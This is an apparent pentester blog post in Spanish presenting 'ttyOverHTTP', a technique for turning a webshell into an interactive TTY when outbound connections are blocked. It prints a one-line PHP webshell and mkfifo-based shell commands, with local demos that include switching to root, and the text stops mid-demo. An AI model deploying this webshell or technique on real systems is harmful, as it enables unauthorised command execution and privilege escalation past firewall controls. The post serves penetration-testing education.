<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>ttyOverHTTP - Herramienta - k4lelv.io</title>
<meta name="description" content="Utilidad en Python para obtener una TTY totalmente interactiva mediante explotación web sin necesidad de entablarse una Reverse Shell.">



<meta property="og:type" content="article">
<meta property="og:locale" content="en_US">
<meta property="og:site_name" content="k4lelv.io">
<meta property="og:title" content="ttyOverHTTP - Herramienta">
<meta property="og:url" content="http://localhost:4000/ttyoverhttp/">


  <meta property="og:description" content="Utilidad en Python para obtener una TTY totalmente interactiva mediante explotación web sin necesidad de entablarse una Reverse Shell.">



  <meta property="og:image" content="http://localhost:4000https://k4lelv.github.io/assets/images/ttyOverHTTP/ttyoverhttp-banner.jpg">





  <meta property="article:published_time" content="2020-02-04T00:00:00+00:00">





  

  


<link rel="canonical" href="http://localhost:4000/ttyoverhttp/">







  <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Person",
      "name": "k4lelv",
      "url": "http://localhost:4000",
      "sameAs": null
    }
  </script>







<!-- end _includes/seo.html -->


<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="k4lelv.io Feed">

<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">

<!--[if IE ]>
  <style>
    /* old IE unsupported flexbox fixes */
    .greedy-nav .site-title {
      padding-right: 3em;
    }
    .greedy-nav button {
      position: absolute;
      top: 0;
      right: 0;
      height: 100%;
    }
  </style>
<![endif]-->



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
          <a class="site-logo" href="/"><img src="https://k4lelv.github.io/assets/images/masthead.png" alt=""></a>
                
        <ul class="visible-links"><li class="masthead__menu-item">
              <a href="/" >Home</a>
            </li><li class="masthead__menu-item">
              <a href="/year-archive/" >Artículos</a>
            </li><li class="masthead__menu-item">
              <a href="/categories/" >Categorías</a>
            </li><li class="masthead__menu-item">
              <a href="/tags/" >Etiquetas</a>
            </li><li class="masthead__menu-item">
              <a href="/videos/" >Vídeos</a>
            </li><li class="masthead__menu-item">
              <a href="/buscador/" >Buscador</a>
            </li><li class="masthead__menu-item">
              <a href="/about/" >Contacto</a>
            </li></ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>
    

    <div class="initial-content">
      


  
    



<nav class="breadcrumbs">
  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
    
    
    
      
        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
          <meta itemprop="position" content="1" />
        </li>
        <span class="sep">/</span>
      
      
        <li class="current">ttyOverHTTP - Herramienta</li>
      
    
  </ol>
</nav>

  


<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      

      
        <img src="https://k4lelv.github.io/assets/images/avatar.png" alt="k4lelv" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">k4lelv</h3>
    
    
      <p class="author__bio" itemprop="description">
        Pentester / OSCP / OSWP
      </p>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Tenerife</span>
        </li>
      

      

      

      
        <li>
          <a href="mailto:s4vipriv@gmail.com">
            <meta itemprop="email" content="s4vipriv@gmail.com" />
            <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i> Email
          </a>
        </li>
      

      

      
        <li>
          <a href="https://twitter.com/k4lelv" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter
          </a>
        </li>
      

      

      

      
        <li>
          <a href="https://www.linkedin.com/in/k4lelv" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
          </a>
        </li>
      

      

      

      

      

      
        <li>
          <a href="https://github.com/k4lelv" itemprop="sameAs" rel="nofollow noopener noreferrer">
            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
          </a>
        </li>
      

      

      

      

      

      

      

      

      
        
          <li>
            <a href="https://youtube.com/c/k4lelv" itemprop="sameAs" rel="nofollow noopener noreferrer">
              <i class="fab fa-fw fa-youtube" aria-hidden="true"></i> YouTube
            </a>
          </li>
        
      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>


  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="ttyOverHTTP - Herramienta">
    <meta itemprop="description" content="Utilidad en Python para obtener una TTY totalmente interactiva mediante explotación web sin necesidad de entablarse una Reverse Shell.">
    <meta itemprop="datePublished" content="February 04, 2020">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">ttyOverHTTP - Herramienta
</h1>
          
        </header>
      

      <section class="page__content" itemprop="text">
        
        <p class="page__meta">
          
            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2020-02-04T00:00:00+00:00">February 04, 2020 </time>&emsp;
          
          
        </p>
        <p><img src="https://k4lelv.github.io/assets/images/ttyOverHTTP/linux-banner.png" alt="" /></p>

<p>Podéis encontrar esta herramienta en el siguiente enlace:</p>

<ul>
  <li><a href="https://github.com/k4lelv/ttyoverhttp">https://github.com/k4lelv/ttyoverhttp</a></li>
</ul>

<h2 id="qué-es-ttyoverhttp">¿Qué es ttyOverHTTP?</h2>

<p><strong>ttyOverHTTP</strong> no es más que una herramienta de utilidad la cual nos permitirá en base a una webshell, sin la necesidad de entablarnos una reverse shell, contar con una TTY completamente interactiva, haciendo uso para ello de la utilidad <code class="language-plaintext highlighter-rouge">mkfifo</code>.</p>

<p>Para los que no entiendan la problemática de las webshells, podéis probarlo por vuestra cuenta… simplemente montad un servidor apache y alojad este recurso PHP en la ruta <code class="language-plaintext highlighter-rouge">/var/www/html/cmd.php</code>:</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
    <span class="k">echo</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<p>Como es de esperar, a través de la variable <code class="language-plaintext highlighter-rouge">cmd</code> está más que claro que vamos a ser capaces de ejecutar comandos a nivel de sistema como el usuario <code class="language-plaintext highlighter-rouge">www-data</code>:</p>

<p align="center">
<img src="https://k4lelv.github.io/assets/images/ttyOverHTTP/first-webserver.png" />
</p>

<p>Sin embargo, fijaros qué es lo que pasa si tratamos por ejemplo de efectuar una migración de usuario:</p>

<p align="center">
<img src="https://k4lelv.github.io/assets/images/ttyOverHTTP/second-webserver.png" />
</p>

<p>No podemos introducir la contraseña del usuario <code class="language-plaintext highlighter-rouge">root</code>, cosa que podríamos hacer si hiciéramos un tratamiento de la TTY desde consola, ya sabéis… el <code class="language-plaintext highlighter-rouge">stty raw -echo</code> y toda la movida.</p>

<p>De la misma forma, tampoco podemos correr desde una webshell el servicio <code class="language-plaintext highlighter-rouge">mysql</code> o <code class="language-plaintext highlighter-rouge">php</code> en modo interactivo, ni hacer un <code class="language-plaintext highlighter-rouge">sudo su</code> para introducir la contraseña. Tampoco podemos hacer desplazamientos entre directorios, me refiero… si hacemos <code class="language-plaintext highlighter-rouge">pwd</code> veremos la ruta actual en la que nos situamos, pero si luego enviamos un <code class="language-plaintext highlighter-rouge">cd /home</code> y volvemos en la siguiente consulta a hacer un <code class="language-plaintext highlighter-rouge">pwd</code> veremos que seguiremos en el mismo directorio inicial, no habiéndose efectuado el desplazamiento.</p>

<p>Todo esto sucede porque básicamente no estamos en una TTY, podemos comprobarlo de la siguiente forma:</p>

<p align="center">
<img src="https://k4lelv.github.io/assets/images/ttyOverHTTP/third-webserver.png" />
</p>

<p>Entonces bien, ¿qué hacemos en estos casos?, porque si nos entabláramos una Reverse Shell obviamente ya todo estaría hecho, ¿pero y si por iptables hay ciertas reglas configuradas tanto por ipv4 como por ipv6 que impiden conexiones salientes para entablarnos nuestra conexión?.</p>

<p>Efectivamente, se nos complica un poco la labor.</p>

<h2 id="movimiento-lateral">Movimiento lateral</h2>

<p>En Linux, hay una utilidad que nos permite crear archivos <strong>FIFO</strong>. Un fichero FIFO es similar a una interconexión o tubería, excepto en que se crea de una forma distinta. En vez de ser un canal de comunicaciones anónimo, un fichero especial FIFO se mete en el sistema de ficheros mediante una llamada a <strong>mkfifo</strong>.</p>

<p>Veamos un ejemplo práctico de su uso. Por un lado desde terminal, haremos lo siguiente:</p>

<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">┌─</span><span class="p">[</span><span class="n">k4lelv</span><span class="err">@</span><span class="n">parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="err">~</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">example</span><span class="p">]</span>
<span class="err">└──╼</span> <span class="err">$</span><span class="n">mkfifo</span> <span class="n">input</span><span class="p">;</span> <span class="n">tail</span> <span class="o">-</span><span class="n">f</span> <span class="n">input</span> <span class="o">|</span> <span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span> <span class="m">2</span><span class="o">&gt;&amp;</span><span class="m">1</span> <span class="o">&gt;</span> <span class="n">output</span>
</code></pre></div></div>

<p>Esto se quedará en escucha, por lo que posteriormente deberemos abrir una nueva consola aparte para hacer las pruebas. Ahora haremos lo siguiente:</p>

<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">┌─</span><span class="p">[</span><span class="n">k4lelv</span><span class="err">@</span><span class="n">parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="err">~</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">example</span><span class="p">]</span>
<span class="err">└──╼</span> <span class="err">$</span><span class="n">ls</span>
<span class="n">input</span>  <span class="n">output</span>
<span class="err">┌─</span><span class="p">[</span><span class="n">k4lelv</span><span class="err">@</span><span class="n">parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="err">~</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">example</span><span class="p">]</span>
<span class="err">└──╼</span> <span class="err">$</span><span class="n">echo</span> <span class="s">"whoami"</span> <span class="o">&gt;</span> <span class="n">input</span>
<span class="err">┌─</span><span class="p">[</span><span class="n">k4lelv</span><span class="err">@</span><span class="n">parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="err">~</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">example</span><span class="p">]</span>
<span class="err">└──╼</span> <span class="err">$</span><span class="n">cat</span> <span class="n">output</span> 
<span class="n">k4lelv</span>
<span class="err">┌─</span><span class="p">[</span><span class="n">k4lelv</span><span class="err">@</span><span class="n">parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="err">~</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">example</span><span class="p">]</span>
<span class="err">└──╼</span> <span class="err">$</span><span class="n">echo</span> <span class="s">"pwd"</span> <span class="o">&gt;</span> <span class="n">input</span>
<span class="err">┌─</span><span class="p">[</span><span class="n">k4lelv</span><span class="err">@</span><span class="n">parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="err">~</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">example</span><span class="p">]</span>
<span class="err">└──╼</span> <span class="err">$</span><span class="n">echo</span> <span class="s">"cd .."</span> <span class="o">&gt;</span> <span class="n">input</span>
<span class="err">┌─</span><span class="p">[</span><span class="n">k4lelv</span><span class="err">@</span><span class="n">parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="err">~</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">example</span><span class="p">]</span>
<span class="err">└──╼</span> <span class="err">$</span><span class="n">echo</span> <span class="s">"pwd"</span> <span class="o">&gt;</span> <span class="n">input</span>
<span class="err">┌─</span><span class="p">[</span><span class="n">k4lelv</span><span class="err">@</span><span class="n">parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="err">~</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">example</span><span class="p">]</span>
<span class="err">└──╼</span> <span class="err">$</span><span class="n">cat</span> <span class="n">output</span> 
<span class="n">k4lelv</span>
<span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">k4lelv</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">example</span>
<span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">k4lelv</span><span class="o">/</span><span class="n">Desktop</span>
</code></pre></div></div>

<p>Si os fijáis, para cada comando proporcionado en <code class="language-plaintext highlighter-rouge">input</code>, se nos lista el resultado del comando aplicado a nivel de sistema en el fichero <code class="language-plaintext highlighter-rouge">output</code>.</p>

<p>Ojo cuidado, esto sigue sin ser una TTY, sin embargo… podemos hacer lo siguiente:</p>

<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">┌─</span><span class="p">[</span><span class="n">k4lelv</span><span class="err">@</span><span class="n">parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="err">~</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">example</span><span class="p">]</span>
<span class="err">└──╼</span> <span class="err">$</span><span class="n">echo</span> <span class="s">"script /dev/null -c bash"</span> <span class="o">&gt;</span> <span class="n">input</span>
<span class="err">┌─</span><span class="p">[</span><span class="n">k4lelv</span><span class="err">@</span><span class="n">parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="err">~</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">example</span><span class="p">]</span>
<span class="err">└──╼</span> <span class="err">$</span><span class="n">cat</span> <span class="n">output</span> 
<span class="n">k4lelv</span>
<span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">k4lelv</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">example</span>
<span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">k4lelv</span><span class="o">/</span><span class="n">Desktop</span>
<span class="n">Script</span> <span class="n">started</span><span class="p">,</span> <span class="n">file</span> <span class="n">is</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
<span class="err">┌─</span><span class="p">[</span><span class="n">k4lelv</span><span class="err">@</span><span class="n">parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="err">~</span><span class="o">/</span><span class="n">Desktop</span><span class="p">]</span>
<span class="err">└──╼</span> <span class="err">$┌─</span><span class="p">[</span><span class="n">k4lelv</span><span class="err">@</span><span class="n">parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="err">~</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">example</span><span class="p">]</span>
<span class="err">└──╼</span> <span class="err">$</span>
</code></pre></div></div>

<p>Fijaros cómo ahora se nos abre una consola aparte de la nuestra al leer el ficherito <code class="language-plaintext highlighter-rouge">output</code>. Tal vez lo veis mejor así:</p>

<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">┌─</span><span class="p">[</span><span class="n">k4lelv</span><span class="err">@</span><span class="n">parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="err">~</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">example</span><span class="p">]</span>
<span class="err">└──╼</span> <span class="err">$</span><span class="n">cat</span> <span class="n">output</span><span class="p">;</span> <span class="n">echo</span>
<span class="n">k4lelv</span>
<span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">k4lelv</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">example</span>
<span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">k4lelv</span><span class="o">/</span><span class="n">Desktop</span>
<span class="n">Script</span> <span class="n">started</span><span class="p">,</span> <span class="n">file</span> <span class="n">is</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
<span class="err">┌─</span><span class="p">[</span><span class="n">k4lelv</span><span class="err">@</span><span class="n">parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="err">~</span><span class="o">/</span><span class="n">Desktop</span><span class="p">]</span>
<span class="err">└──╼</span> <span class="err">$</span>
<span class="err">┌─</span><span class="p">[</span><span class="n">k4lelv</span><span class="err">@</span><span class="n">parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="err">~</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">example</span><span class="p">]</span>
<span class="err">└──╼</span> <span class="err">$</span>
</code></pre></div></div>

<p>Ahí está. La superior a la de abajo del todo es la gestionada desde los ficheros <code class="language-plaintext highlighter-rouge">input</code> y <code class="language-plaintext highlighter-rouge">output</code>. ¿Qué es lo mejor de todo?, lo siguiente:</p>

<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">┌─</span><span class="p">[</span><span class="n">k4lelv</span><span class="err">@</span><span class="n">parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="err">~</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">example</span><span class="p">]</span>
<span class="err">└──╼</span> <span class="err">$</span><span class="n">echo</span> <span class="s">"tty"</span> <span class="o">&gt;</span> <span class="n">input</span>
<span class="err">┌─</span><span class="p">[</span><span class="n">k4lelv</span><span class="err">@</span><span class="n">parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="err">~</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">example</span><span class="p">]</span>
<span class="err">└──╼</span> <span class="err">$</span><span class="n">cat</span> <span class="n">output</span><span class="p">;</span> <span class="n">echo</span>
<span class="n">k4lelv</span>
<span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">k4lelv</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">example</span>
<span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">k4lelv</span><span class="o">/</span><span class="n">Desktop</span>
<span class="n">Script</span> <span class="n">started</span><span class="p">,</span> <span class="n">file</span> <span class="n">is</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
<span class="err">┌─</span><span class="p">[</span><span class="n">k4lelv</span><span class="err">@</span><span class="n">parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="err">~</span><span class="o">/</span><span class="n">Desktop</span><span class="p">]</span>
<span class="err">└──╼</span> <span class="err">$</span><span class="n">tty</span>
<span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">pts</span><span class="o">/</span><span class="m">4</span>
<span class="err">┌─</span><span class="p">[</span><span class="n">k4lelv</span><span class="err">@</span><span class="n">parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="err">~</span><span class="o">/</span><span class="n">Desktop</span><span class="p">]</span>
<span class="err">└──╼</span> <span class="err">$</span>
<span class="err">┌─</span><span class="p">[</span><span class="n">k4lelv</span><span class="err">@</span><span class="n">parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="err">~</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">example</span><span class="p">]</span>
<span class="err">└──╼</span> <span class="err">$</span>
</code></pre></div></div>

<p>Ya estamos en una TTY, y a partir de aquí es sencillo aprovechar al máximo las utilidades de consola:</p>

<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">┌─</span><span class="p">[</span><span class="n">k4lelv</span><span class="err">@</span><span class="n">parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="err">~</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">example</span><span class="p">]</span>
<span class="err">└──╼</span> <span class="err">$</span><span class="n">echo</span> <span class="s">"php --interactive"</span> <span class="o">&gt;</span> <span class="n">input</span>
<span class="err">┌─</span><span class="p">[</span><span class="n">k4lelv</span><span class="err">@</span><span class="n">parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="err">~</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">example</span><span class="p">]</span>
<span class="err">└──╼</span> <span class="err">$</span><span class="n">echo</span> <span class="err">'$</span><span class="n">word</span> <span class="o">=</span> <span class="s">"Hola"</span><span class="p">;</span><span class="err">'</span> <span class="o">&gt;</span> <span class="n">input</span>
<span class="err">┌─</span><span class="p">[</span><span class="n">k4lelv</span><span class="err">@</span><span class="n">parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="err">~</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">example</span><span class="p">]</span>
<span class="err">└──╼</span> <span class="err">$</span><span class="n">echo</span> <span class="err">'</span><span class="n">echo</span> <span class="err">$</span><span class="n">word</span><span class="p">;</span><span class="err">'</span> <span class="o">&gt;</span> <span class="n">input</span>
<span class="err">┌─</span><span class="p">[</span><span class="n">k4lelv</span><span class="err">@</span><span class="n">parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="err">~</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">example</span><span class="p">]</span>
<span class="err">└──╼</span> <span class="err">$</span><span class="n">echo</span> <span class="err">'</span><span class="n">quit</span><span class="err">'</span> <span class="o">&gt;</span> <span class="n">input</span>
<span class="err">┌─</span><span class="p">[</span><span class="n">k4lelv</span><span class="err">@</span><span class="n">parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="err">~</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">example</span><span class="p">]</span>
<span class="err">└──╼</span> <span class="err">$</span><span class="n">echo</span> <span class="err">'</span><span class="n">whoami</span><span class="err">'</span> <span class="o">&gt;</span> <span class="n">input</span>
<span class="err">┌─</span><span class="p">[</span><span class="n">k4lelv</span><span class="err">@</span><span class="n">parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="err">~</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">example</span><span class="p">]</span>
<span class="err">└──╼</span> <span class="err">$</span><span class="n">cat</span> <span class="n">output</span>
<span class="n">k4lelv</span>
<span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">k4lelv</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">example</span>
<span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">k4lelv</span><span class="o">/</span><span class="n">Desktop</span>
<span class="n">Script</span> <span class="n">started</span><span class="p">,</span> <span class="n">file</span> <span class="n">is</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
<span class="err">┌─</span><span class="p">[</span><span class="n">k4lelv</span><span class="err">@</span><span class="n">parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="err">~</span><span class="o">/</span><span class="n">Desktop</span><span class="p">]</span>
<span class="err">└──╼</span> <span class="err">$</span><span class="n">tty</span>
<span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">pts</span><span class="o">/</span><span class="m">4</span>
<span class="err">┌─</span><span class="p">[</span><span class="n">k4lelv</span><span class="err">@</span><span class="n">parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="err">~</span><span class="o">/</span><span class="n">Desktop</span><span class="p">]</span>
<span class="err">└──╼</span> <span class="err">$</span><span class="n">php</span> <span class="o">--</span><span class="n">interactive</span>
<span class="n">Interactive</span> <span class="n">mode</span> <span class="n">enabled</span>

<span class="n">php</span> <span class="o">&gt;</span> <span class="err">$</span><span class="n">word</span> <span class="o">=</span> <span class="s">"Hola"</span><span class="p">;</span>
<span class="n">php</span> <span class="o">&gt;</span> <span class="n">echo</span> <span class="err">$</span><span class="n">word</span><span class="p">;</span>
<span class="n">Hola</span>
<span class="n">php</span> <span class="o">&gt;</span> <span class="n">quit</span>
<span class="err">┌─</span><span class="p">[</span><span class="n">k4lelv</span><span class="err">@</span><span class="n">parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="err">~</span><span class="o">/</span><span class="n">Desktop</span><span class="p">]</span>
<span class="err">└──╼</span> <span class="err">$</span><span class="n">whoami</span>
<span class="n">k4lelv</span>
<span class="err">┌─</span><span class="p">[</span><span class="n">k4lelv</span><span class="err">@</span><span class="n">parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="err">~</span><span class="o">/</span><span class="n">Desktop</span><span class="p">]</span>
<span class="err">└──╼</span> <span class="err">$</span>
<span class="err">┌─</span><span class="p">[</span><span class="n">k4lelv</span><span class="err">@</span><span class="n">parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="err">~</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">example</span><span class="p">]</span>
<span class="err">└──╼</span> <span class="err">$</span>
</code></pre></div></div>

<p>De igual manera, podemos efectuar migraciones de usuario o convertirnos en root proporcionando la contraseña:</p>

<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">─</span><span class="p">[</span><span class="n">k4lelv</span><span class="err">@</span><span class="n">parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="err">~</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">example</span><span class="p">]</span>
<span class="err">└──╼</span> <span class="err">$</span><span class="n">echo</span> <span class="s">"sudo su"</span> <span class="o">&gt;</span> <span class="n">input</span>
<span class="err">┌─</span><span class="p">[</span><span class="n">k4lelv</span><span class="err">@</span><span class="n">parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="err">~</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">example</span><span class="p">]</span>
<span class="err">└──╼</span> <span class="err">$</span><span class="n">echo</span> <span class="s">"************"</span> <span class="o">&gt;</span> <span class="n">input</span> <span class="err">#</span> <span class="n">Aquí</span> <span class="n">pondríais</span> <span class="n">vuestra</span> <span class="n">contraseña</span>
<span class="err">┌─</span><span class="p">[</span><span class="n">k4lelv</span><span class="err">@</span><span class="n">parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="err">~</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">example</span><span class="p">]</span>
<span class="err">└──╼</span> <span class="err">$</span><span class="n">cat</span> <span class="n">output</span> <span class="p">;</span> <span class="n">echo</span>
<span class="n">k4lelv</span>
<span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">k4lelv</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">example</span>
<span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">k4lelv</span><span class="o">/</span><span class="n">Desktop</span>
<span class="n">Script</span> <span class="n">started</span><span class="p">,</span> <span class="n">file</span> <span class="n">is</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
<span class="err">┌─</span><span class="p">[</span><span class="n">k4lelv</span><span class="err">@</span><span class="n">parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="err">~</span><span class="o">/</span><span class="n">Desktop</span><span class="p">]</span>
<span class="err">└──╼</span> <span class="err">$</span><span class="n">tty</span>
<span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">pts</span><span class="o">/</span><span class="m">4</span>
<span class="err">┌─</span><span class="p">[</span><span class="n">k4lelv</span><span class="err">@</span><span class="n">parrot</span><span class="p">]</span><span class="err">─</span><span class="p">[</span><span class="err">~</span><span class="o">/</span><span class="n">Desktop</span><span class="p">]</span>
<span class="err">└──╼</span> <span class="err">$</span><span class="n">php</span> <span class="o">--</span><span class="n">interactive</span>
<span class="n">Interactive</span> <span class="n">mode</span> <span class="n">enabled</span>

<span class="n">php</span> <span class="o">&gt;</span> <span class="err">$</span><span class="n">word</span> <span class="o">=</span> <span class="s">"Hola"</span><span class="p">;</span>
<span class="n">php</span> <span class="o">&gt;</span> <span class="n">echo</span> <span class="err">$</span><span class="n">word</span><span class="p">;</span>
<span class="n">Hola</span>
<span class="n">php</span> <span class="o">&gt;</span> <span class="n">quit</span>
